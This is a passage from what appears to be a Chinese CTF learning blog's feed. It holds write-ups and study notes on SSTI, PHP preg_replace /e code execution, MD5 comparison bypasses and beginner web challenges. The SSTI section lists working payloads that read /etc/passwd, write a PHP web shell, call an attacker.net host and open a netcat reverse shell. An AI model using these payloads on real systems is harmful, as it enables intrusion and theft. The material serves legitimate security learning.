<span class="token operator">%</span> <span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> pic<span class="token punctuation">.</span>getpixel<span class="token punctuation">(</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">:</span>                flag <span class="token operator">+=</span> <span class="token string">'1'</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                flag <span class="token operator">+=</span> <span class="token string">'0'</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>            <span class="token keyword">break</span></code></pre><p>跑出来<code>0110011001101100011000010110011101011111011010010111001100111010011001100011010100111000001100100110010100111001011000100011001100110001001110010110000101100010011001010011000101100101011001000110011001100100001101110110010001100110001101010011011000110101011001100110010101100011011001100011011001100110001101100110011000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000</code></p><p>去二进制转字符串，得到flag</p><img src="/article/dasctf2020/image-20201228203737416.png" class="" title="image-20201228203737416" loading="lazy"><hr><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>还是太菜了，有些点还是比较生疏，重点学习了一波phar反序列化，继续学习。</p>]]></content>
      
      
      <categories>
          
          <category> Write-Up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSTI模板注入</title>
      <link href="article/ssti/"/>
      <url>article/ssti/</url>
      
        <content type="html"><![CDATA[<p>SSTI模板注入</p><a id="more"></a><h1 id="SSTI漏洞"><a href="#SSTI漏洞" class="headerlink" title="SSTI漏洞"></a>SSTI漏洞</h1><h2 id="什么是模板注入"><a href="#什么是模板注入" class="headerlink" title="什么是模板注入"></a>什么是模板注入</h2><p> SSTI （服务器端模板注入）也是格式化字符串的一个非常好的例子，凡是使用模板的地方都可能会出现 SSTI 的问题，SSTI 不属于任何一种语言，沙盒绕过也不是。这种模板不仅存于Python中，PHP中也有不少模板引擎。</p><h2 id="检测流程"><a href="#检测流程" class="headerlink" title="检测流程"></a>检测流程</h2><img src="/article/ssti/SSTI%E6%B5%81%E7%A8%8B.png" class="" title="SSTI流程" loading="lazy"><p>首先输入<code>&#123;&#123;7*7&#125;&#125;</code>，返回值为<code>49</code>则表明存在SSTI</p><p>输入<code>&#123;&#123;system('cat /etc/passwd')&#125;&#125;</code>如果返回值则表明为<strong>Smarty模板引擎</strong></p><p>输入<code>&#123;&#123;7*'7'&#125;&#125;</code>如果返回值是<code>49</code>则为<strong>Twig模板引擎</strong></p><p>如果返回值是<code>7777777</code>则为<strong>JinJa模板引擎</strong></p><hr><h2 id="姿势总结"><a href="#姿势总结" class="headerlink" title="姿势总结"></a>姿势总结</h2><h3 id="Smarty"><a href="#Smarty" class="headerlink" title="Smarty"></a>Smarty</h3><p>payload：</p><pre class="language-none"><code class="language-none">&#123;self::getStreamVariable(&quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;)&#125;&#123;Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,&quot;&lt;?php passthru($_GET[&#39;cmd&#39;]); ?&gt;&quot;,self::clearConfig())&#125;&#123;literal&#125;alert(&#39;xss&#39;);&#123;&#x2F;literal&#125;&#123;if readfile(&#39;&#x2F;flag&#39;)&#125;&#123;&#x2F;if&#125;</code></pre><h3 id="Twig"><a href="#Twig" class="headerlink" title="Twig"></a>Twig</h3><p>payload:</p><pre class="language-none"><code class="language-none">&#123;&#123;_self.env.setCache(&quot;ftp:&#x2F;&#x2F;attacker.net:2121&quot;)&#125;&#125;&#123;&#123;_self.env.loadTemplate(&quot;backdoor&quot;)&#125;&#125;&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;cat &#x2F;etc&#x2F;passwd&quot;)&#125;&#125;&lt;#assign ex&#x3D;&quot;freemarker.template.utility.Execute&quot;?new()&gt; $&#123; ex(&quot;cat &#x2F;etc&#x2F;passwd&quot;) &#125;</code></pre><h3 id="Django"><a href="#Django" class="headerlink" title="Django"></a>Django</h3><p>payload:</p><pre class="language-none"><code class="language-none">&#123;user.groups.model._meta.app_config.module.admin.settings.SECRET_KEY&#125;&#123;user.user_permissions.model._meta.app_config.module.admin.settings.SECRET_KEY&#125;</code></pre><h3 id="Jinja"><a href="#Jinja" class="headerlink" title="Jinja"></a>Jinja</h3><p>payload:</p><pre class="language-none"><code class="language-none">&#123;&#123; &#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#39;&#x2F;tmp&#x2F;evil&#39;, &#39;w&#39;).write(&#39;from os import system%0aSHELL &#x3D; system&#39;) &#125;&#125;&#x2F;&#x2F;写文件&#123;&#123; config.from_pyfile(&#39;&#x2F;tmp&#x2F;evil&#39;) &#125;&#125;&#x2F;&#x2F;加载system&#123;&#123; config[&#39;SHELL&#39;](&#39;nc xxxx xx -e &#x2F;bin&#x2F;sh&#39;) &#125;&#125;&#x2F;&#x2F;执行命令反弹SHELL</code></pre><h3 id="Tornado"><a href="#Tornado" class="headerlink" title="Tornado"></a>Tornado</h3><p>payload:</p><pre class="language-none"><code class="language-none">http:&#x2F;&#x2F;ip:port&#x2F;error?msg&#x3D;&#123;&#123;handler.settings&#125;&#125;</code></pre>]]></content>
      
      
      <categories>
          
          <category> 杂谈笔记 </category>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSTI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>preg_replace与代码执行</title>
      <link href="article/preg_replace/"/>
      <url>article/preg_replace/</url>
      
        <content type="html"><![CDATA[<p>参考文章链接： <a href="https://xz.aliyun.com/t/2557">https://xz.aliyun.com/t/2557</a> </p><a id="more"></a><h1 id="preg-replace与代码执行"><a href="#preg-replace与代码执行" class="headerlink" title="preg_replace与代码执行"></a>preg_replace与代码执行</h1><p> <strong>preg_replace</strong> <strong>/e</strong> 模式下的代码执行问题 </p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">complex</span><span class="token punctuation">(</span><span class="token variable">$re</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/('</span> <span class="token punctuation">.</span> <span class="token variable">$re</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">')/ei'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'strtolower("\\1")'</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token keyword">as</span> <span class="token variable">$re</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token function">complex</span><span class="token punctuation">(</span><span class="token variable">$re</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">.</span> <span class="token double-quoted-string string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p> <strong>preg_replace</strong> 使用了 <strong>/e</strong> 模式，导致可以代码执行，而且该函数的第一个和第三个参数都是我们可以控制的。 </p><p> <strong>preg_replace</strong> 函数在匹配到符号正则的字符串时，会将替换字符串（也就是上图 <strong>preg_replace</strong> 函数的第二个参数）当做代码来执行，然而这里的第二个参数却固定为 <strong>‘strtolower(“\1”)’</strong> 字符串.</p><p>上面的命令执行，相当于 <strong>eval(‘strtolower(“\1”);’)</strong> 结果，当中的 <strong>\1</strong> 实际上就是 <strong>\1</strong> ，而 <strong>\1</strong> 在正则表达式中有自己的含义。</p><blockquote><p><strong>反向引用</strong></p><p>对一个正则表达式模式或部分模式 <strong>两边添加圆括号</strong> 将导致相关 <strong>匹配存储到一个临时缓冲区</strong> 中，所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。缓冲区编号从 1 开始，最多可存储 99 个捕获的子表达式。每个缓冲区都可以使用 ‘\n’ 访问，其中 n 为一个标识特定缓冲区的一位或两位十进制数。</p></blockquote><p> <strong>payload</strong> 为： <strong>/?.*={${phpinfo()}}</strong> ，即 <strong>GET</strong> 方式传入的参数名为 <strong>/?.*</strong> ，值为 <strong>{${phpinfo()}}</strong> 。 </p><pre class="language-none"><code class="language-none">$re&#x3D;.*$str&#x3D;&#123;$&#123;phpinfo()&#125;&#125;原先的语句： preg_replace(&#39;&#x2F;(&#39; . $re . &#39;)&#x2F;ei&#39;, &#39;strtolower(&quot;\\1&quot;)&#39;, $str);变成了语句： preg_replace(&#39;&#x2F;(.*)&#x2F;ei&#39;, &#39;strtolower(&quot;\\1&quot;)&#39;, &#123;$&#123;phpinfo()&#125;&#125;);</code></pre><hr><p> 由于在PHP中，对于传入的非法的 <strong>$_GET</strong> 数组参数名，会将其转换成下划线，这就导致我们正则匹配失效。 </p><p> 当非法字符为首字母时，只有点号会被替换成下划线，所以我们要做的就是换一个正则表达式，让其匹配到 <strong>{${phpinfo()}}</strong> 即可执行 <strong>phpinfo</strong> 函数。<strong>payload</strong> ： <strong>\S*=${phpinfo()}</strong> </p><p> 为什么要匹配到 <strong>{${phpinfo()}}</strong> 或者 <strong>${phpinfo()}</strong> ，才能执行 <strong>phpinfo</strong> 函数，这是一个小坑。这实际上是 <a href="http://php.net/manual/zh/language.variables.variable.php">PHP可变变量</a> 的原因。在PHP中双引号包裹的字符串中可以解析变量，而单引号则不行。 <strong>${phpinfo()}</strong> 中的 <strong>phpinfo()</strong> 会被当做变量先执行，执行后，即变成 <strong>${1}</strong> (phpinfo()成功执行返回true)。 </p><p>文章链接： <a href="https://xz.aliyun.com/t/2557">https://xz.aliyun.com/t/2557</a> </p>]]></content>
      
      
      <categories>
          
          <category> 杂谈笔记 </category>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>md5比较</title>
      <link href="article/md5/"/>
      <url>article/md5/</url>
      
        <content type="html"><![CDATA[<p>MD5弱类型比较，强类型比较以及真实碰撞</p><a id="more"></a><h1 id="MD5比较类型"><a href="#MD5比较类型" class="headerlink" title="MD5比较类型"></a>MD5比较类型</h1><h2 id="弱类型比较"><a href="#弱类型比较" class="headerlink" title="弱类型比较"></a>弱类型比较</h2><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'a'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'b'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>弱类型比较因为php特性，0e开头会被识别为科学计数法，结果0=0比较成功</p><p>payload：</p><pre class="language-php" data-language="php"><code class="language-php">a<span class="token operator">=</span><span class="token constant">QNKCDZO</span><span class="token operator">&amp;</span>b<span class="token operator">=</span>aabg7XSs</code></pre><p>只要是md5值为0e开头即可</p><hr><h2 id="强比较类型"><a href="#强比较类型" class="headerlink" title="强比较类型"></a>强比较类型</h2><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'a'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'b'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>强类型比较用数组绕过，md5()函数无法解出其数值，就会得到===强比较值相等</p><p>payload：</p><pre class="language-php" data-language="php"><code class="language-php">a<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">111</span><span class="token operator">&amp;</span>b<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span>aaa</code></pre><p>传入数组即可</p><hr><h2 id="真实碰撞"><a href="#真实碰撞" class="headerlink" title="真实碰撞"></a>真实碰撞</h2><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'a'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'b'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>真实md5碰撞，由于string()函数，不能输入数组只能输入字符串</p><p>payload：</p><pre class="language-php" data-language="php"><code class="language-php">a<span class="token operator">=</span><span class="token operator">%</span><span class="token number">4</span>d<span class="token operator">%</span>c9<span class="token operator">%</span><span class="token number">68</span><span class="token operator">%</span>ff<span class="token operator">%</span><span class="token number">0</span>e<span class="token operator">%</span>e3<span class="token operator">%</span><span class="token number">5</span>c<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">95</span><span class="token operator">%</span><span class="token number">72</span><span class="token operator">%</span>d4<span class="token operator">%</span><span class="token number">77</span><span class="token operator">%</span><span class="token number">7</span>b<span class="token operator">%</span><span class="token number">72</span><span class="token operator">%</span><span class="token number">15</span><span class="token operator">%</span><span class="token number">87</span><span class="token operator">%</span>d3<span class="token operator">%</span><span class="token number">6</span>f<span class="token operator">%</span>a7<span class="token operator">%</span>b2<span class="token operator">%</span><span class="token number">1</span>b<span class="token operator">%</span>dc<span class="token operator">%</span><span class="token number">56</span><span class="token operator">%</span>b7<span class="token operator">%</span><span class="token number">4</span>a<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span>c0<span class="token operator">%</span><span class="token number">78</span><span class="token operator">%</span><span class="token number">3</span>e<span class="token operator">%</span><span class="token number">7</span>b<span class="token operator">%</span><span class="token number">95</span><span class="token operator">%</span><span class="token number">18</span><span class="token operator">%</span>af<span class="token operator">%</span>bf<span class="token operator">%</span>a2<span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span>a8<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span><span class="token number">4</span>b<span class="token operator">%</span>f3<span class="token operator">%</span><span class="token number">6</span>e<span class="token operator">%</span><span class="token number">8</span>e<span class="token operator">%</span><span class="token number">4</span>b<span class="token operator">%</span><span class="token number">55</span><span class="token operator">%</span>b3<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">42</span><span class="token operator">%</span><span class="token number">75</span><span class="token operator">%</span><span class="token number">93</span><span class="token operator">%</span>d8<span class="token operator">%</span><span class="token number">49</span><span class="token operator">%</span><span class="token number">67</span><span class="token operator">%</span><span class="token number">6</span>d<span class="token operator">%</span>a0<span class="token operator">%</span>d1<span class="token operator">%</span><span class="token number">55</span><span class="token operator">%</span><span class="token number">5</span>d<span class="token operator">%</span><span class="token number">83</span><span class="token operator">%</span><span class="token number">60</span><span class="token operator">%</span>fb<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">07</span><span class="token operator">%</span>fe<span class="token operator">%</span>a2<span class="token operator">&amp;</span>b<span class="token operator">=</span><span class="token operator">%</span><span class="token number">4</span>d<span class="token operator">%</span>c9<span class="token operator">%</span><span class="token number">68</span><span class="token operator">%</span>ff<span class="token operator">%</span><span class="token number">0</span>e<span class="token operator">%</span>e3<span class="token operator">%</span><span class="token number">5</span>c<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">95</span><span class="token operator">%</span><span class="token number">72</span><span class="token operator">%</span>d4<span class="token operator">%</span><span class="token number">77</span><span class="token operator">%</span><span class="token number">7</span>b<span class="token operator">%</span><span class="token number">72</span><span class="token operator">%</span><span class="token number">15</span><span class="token operator">%</span><span class="token number">87</span><span class="token operator">%</span>d3<span class="token operator">%</span><span class="token number">6</span>f<span class="token operator">%</span>a7<span class="token operator">%</span>b2<span class="token operator">%</span><span class="token number">1</span>b<span class="token operator">%</span>dc<span class="token operator">%</span><span class="token number">56</span><span class="token operator">%</span>b7<span class="token operator">%</span><span class="token number">4</span>a<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span>c0<span class="token operator">%</span><span class="token number">78</span><span class="token operator">%</span><span class="token number">3</span>e<span class="token operator">%</span><span class="token number">7</span>b<span class="token operator">%</span><span class="token number">95</span><span class="token operator">%</span><span class="token number">18</span><span class="token operator">%</span>af<span class="token operator">%</span>bf<span class="token operator">%</span>a2<span class="token operator">%</span><span class="token number">02</span><span class="token operator">%</span>a8<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span><span class="token number">4</span>b<span class="token operator">%</span>f3<span class="token operator">%</span><span class="token number">6</span>e<span class="token operator">%</span><span class="token number">8</span>e<span class="token operator">%</span><span class="token number">4</span>b<span class="token operator">%</span><span class="token number">55</span><span class="token operator">%</span>b3<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">42</span><span class="token operator">%</span><span class="token number">75</span><span class="token operator">%</span><span class="token number">93</span><span class="token operator">%</span>d8<span class="token operator">%</span><span class="token number">49</span><span class="token operator">%</span><span class="token number">67</span><span class="token operator">%</span><span class="token number">6</span>d<span class="token operator">%</span>a0<span class="token operator">%</span>d1<span class="token operator">%</span>d5<span class="token operator">%</span><span class="token number">5</span>d<span class="token operator">%</span><span class="token number">83</span><span class="token operator">%</span><span class="token number">60</span><span class="token operator">%</span>fb<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">07</span><span class="token operator">%</span>fe<span class="token operator">%</span>a2</code></pre><p>值不等，md5相等即可。md5碰撞。</p><hr><h2 id="0e开头MD5的MD5为0e的MD5"><a href="#0e开头MD5的MD5为0e的MD5" class="headerlink" title="0e开头MD5的MD5为0e的MD5"></a>0e开头MD5的MD5为0e的MD5</h2><p>0e215962017 </p>]]></content>
      
      
      <categories>
          
          <category> 杂谈笔记 </category>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>S3cCTF-出题人gyy-Writeup</title>
      <link href="article/S3cCTF-gyy-Writeup/"/>
      <url>article/S3cCTF-gyy-Writeup/</url>
      
        <content type="html"><![CDATA[<h1 id="S3cCTF-gyy-Writeup"><a href="#S3cCTF-gyy-Writeup" class="headerlink" title="S3cCTF-gyy-Writeup"></a>S3cCTF-gyy-Writeup</h1><p><strong>出题人：gyy</strong></p><p><strong>写在前面：</strong></p><p>本次招新赛我主要负责WEB方面的出题，当然兼顾一些MISC，本着简单易懂的原则，刚开始出了很多简单WEB题，但是这届新生的实力明显比我们当时强= =，后期又赶了一些提升题，当然和真正的CTF比赛还是有非常大的距离，例如在群里放出的周六的题目可以看出。所以，这些只是入门CTF的基础，去年的这时，我们参加的招新比赛比今年更加困难（所以今年我有同感地出了不少简单题），我希望大家不要止步于此，当初我也有一腔热血，觉得CTF不过如此（甚至还想双修）。但，走的越高，越会发现自己越渺小，这条道路可能还没有尽头。技术可以后期培养，这次招新比赛分数也只能作为检测基础的测试，如果你有强烈的意向和兴趣，比比赛成绩更为重要，我们欢迎你和我们联系，希望大家不忘初心，砥砺前行。</p><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="How-to-solve-ctf"><a href="#How-to-solve-ctf" class="headerlink" title="How_to_solve_ctf"></a>How_to_solve_ctf</h2><h3 id="出题解析"><a href="#出题解析" class="headerlink" title="出题解析"></a>出题解析</h3><p>本题旨在指引大家，考了一下HTML的知识</p><h3 id="解题方式"><a href="#解题方式" class="headerlink" title="解题方式"></a>解题方式</h3><p>F12查看源代码，给了提示<code>&lt;!-- html元素是可以修改的 --&gt;</code><br>修改form表单里input文本框的长度限制，提交s3c2020即可获得flag<br>由于是GET传参，也可以直接传<code>key=s3c2020</code>即可</p><img src="/article/S3cCTF-gyy-Writeup/20201122173122547.png" class="" title="web1" loading="lazy"><hr><h2 id="nof12"><a href="#nof12" class="headerlink" title="nof12"></a>nof12</h2><h3 id="出题解析-1"><a href="#出题解析-1" class="headerlink" title="出题解析"></a>出题解析</h3><p>本题利用script限制了鼠标右键和f12</p><h3 id="解题方式-1"><a href="#解题方式-1" class="headerlink" title="解题方式"></a>解题方式</h3><p>与题目 <strong>S3C_NOT_BAD</strong> 重复，Ctrl+U或者burp抓包或者curl访问都可</p><img src="/article/S3cCTF-gyy-Writeup/20201122174018834.png" class="" title="web2" loading="lazy"><hr><h2 id="Local"><a href="#Local" class="headerlink" title="Local"></a>Local</h2><h3 id="出题解析-2"><a href="#出题解析-2" class="headerlink" title="出题解析"></a>出题解析</h3><p>本题旨在考XFF（X-Forwarded-For）和Referer<br>伪造地址三种方式：</p><pre class="language-none"><code class="language-none">Client-Ip: 127.0.0.1X-Forwarded-For: 127.0.0.1Host: 127.0.0.1Referer: 127.0.0.1</code></pre><h3 id="解题方式-2"><a href="#解题方式-2" class="headerlink" title="解题方式"></a>解题方式</h3><p>只有本地管理员才能访问本页面！<br>burp抓包修改即可</p><img src="/article/S3cCTF-gyy-Writeup/20201122174702383.png" class="" title="web3" loading="lazy"><hr><h2 id="Flag-not-found"><a href="#Flag-not-found" class="headerlink" title="Flag not found"></a>Flag not found</h2><h3 id="出题解析-3"><a href="#出题解析-3" class="headerlink" title="出题解析"></a>出题解析</h3><p>302重定向</p><pre class="language-php" data-language="php"><code class="language-php">//flag.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">header</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'Flag: '</span><span class="token punctuation">.</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"s3c&#123;0H_mY_g0d_its_4O4&#125;"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//修改 X-Powered-By信息</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'location:404.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><pre class="language-php" data-language="php"><code class="language-php">//404.php<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>Not Found<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span><span class="token comment">&lt;!-- 才怪 --></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token function">header</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"http/1.1 404 not found"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> @<span class="token function">header</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"status: 404 not found"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;p>The requested URL /flag.php was not found on this server.&lt;/p>"</span><span class="token punctuation">;</span><span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span></code></pre><h3 id="解题方式-3"><a href="#解题方式-3" class="headerlink" title="解题方式"></a>解题方式</h3><p>打开点击后跳转Not Found，仔细看发现界面是伪造的</p><img src="/article/S3cCTF-gyy-Writeup/20201122175207502.png" class="" width="404" loading="lazy"><p>因为界面是我自己写的假界面，特意写了个注释，由此想到重定向<br>直接在header里能看到flag</p><img src="/article/S3cCTF-gyy-Writeup/20201122175439466.png" class="" title="flag" loading="lazy"><p>拿去base64解一下即可获得flag</p><img src="/article/S3cCTF-gyy-Writeup/20201122175814189.png" class="" title="base64" loading="lazy"><hr><h2 id="快速计算"><a href="#快速计算" class="headerlink" title="快速计算"></a>快速计算</h2><h3 id="出题解析-4"><a href="#出题解析-4" class="headerlink" title="出题解析"></a>出题解析</h3><p>本题考查PHP和Python脚本，3秒内…有人能做得到嘛？</p><p>本题网上找一个脚本改改完全没问题，其实还有一题计算字符串（原创题目前网上没有脚本），师傅们说不放就没放啦，有兴趣可以做做 <a href="http://49.234.89.193:8088/">题目链接</a>(链接可能会挂，题目随时可能哪天我就关了…)</p><h3 id="解题方式-4"><a href="#解题方式-4" class="headerlink" title="解题方式"></a>解题方式</h3><p>请在3秒内计算以下算式并提交并提交<br>在服务器设的SESSION，3秒刷新，超时也是不算的<br>设了个小坑，抓个包可以看到，每次提交的请求还有个参数<code>submits=提交</code></p><img src="/article/S3cCTF-gyy-Writeup/20201122180918644.png" class="" title="参数" loading="lazy"><p>如果没有就会die退出</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'submits'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"少了点东西啊...好好看看吧"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>最后放出Payload，师傅们可以自己研究</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token triple-quoted-string string">"""@Time ： 2020/11/22 18:14@Auth ： gyy@File ：1.py@Blog：http://err0r.top"""</span><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://49.234.89.193:8029/"</span>session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">"submits"</span> <span class="token punctuation">:</span> <span class="token string">"提交"</span><span class="token punctuation">&#125;</span>response <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"1--------------------取算式"</span><span class="token punctuation">)</span>cal <span class="token operator">=</span> response<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" "</span> <span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"\n"</span> <span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"\r"</span> <span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"&lt;b>"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"="</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>cal<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"2--------------------计算算式"</span><span class="token punctuation">)</span>result <span class="token operator">=</span> <span class="token builtin">eval</span><span class="token punctuation">(</span>cal<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"3--------------------提交"</span><span class="token punctuation">)</span>data<span class="token punctuation">[</span><span class="token string">'answer'</span><span class="token punctuation">]</span> <span class="token operator">=</span> resultres <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span> data<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span></code></pre><img 